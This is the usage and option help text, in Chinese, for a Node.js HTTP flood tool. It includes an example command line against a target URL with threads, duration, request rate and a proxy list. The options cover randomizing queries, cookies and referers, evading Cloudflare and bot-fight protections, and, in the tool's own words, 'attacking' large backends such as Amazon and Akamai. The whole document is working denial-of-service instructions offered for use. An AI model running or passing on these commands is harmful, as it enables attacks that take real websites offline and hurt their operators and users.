    使用方法:
      node ${process.argv[1]} <GET/POST/HEAD/OPTIONS> <目标地址> <持续时间> <线程数> <请求速率限制> <代理文件> --参数
      Eg:
      node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full --header "f:f" --ip 1.1.1.1:3128 --useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" --useuatxt ua.txt
-----------------------------------------------------
    参数选项:
     --query 1/2/3 ~~~ 带 rand 的查询字符串，例如 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
     --delay <1-1000> ~~~ 请求之间的延迟 1-100 毫秒（最佳）默认 1 毫秒
     --cookie "f=f" ~~~ 用于自定义 cookie - 还支持 %RAND% 的 cookie，例如：“bypassing=%RAND%”
     --bfm true/null ~~~ 如果需要，机器人战斗模式更改为 true，如果不需要则不使用
     --referer seturl / rand ~~~ 如果需要，使用自定义 referer 和 rand - 如果需要生成域名，例如：fwfwwfwfw.net
     --postdata "user=f&pass=%RAND%" ~~~ 如果您需要数据来发布请求方法格式“user=f&pass=f”
     --randrate ~~~ 随机化器速率 1 到 90 良好绕过速率
     --full ~~~ 此新功能仅用于攻击大型后端 ex amazon akamai 和其他... 支持 cf
     --http 1/2/mix ~~~ 新功能选择键入 http 1/2/mix（mix 1 & 2）
     --debug ~~~ 显示您的状态代码（可能低 rps 以使用更多资源）
     --header "f:f" or "f:f#f1:f1" ~~~ 如果需要，请使用自定义标头，用 # 分隔每个标头
     --legit ~~~ 此新功能用于攻击，具有完整合法标头，不适用于 cf
     --ip 代理ip:端口 ~~~ 使用自定义 IP 代理
     --useragent 你的UA ~~~ 使用自定义 useragent
     --useuatxt ua.txt ~~~ 使用自定义UA文件 ua.txt
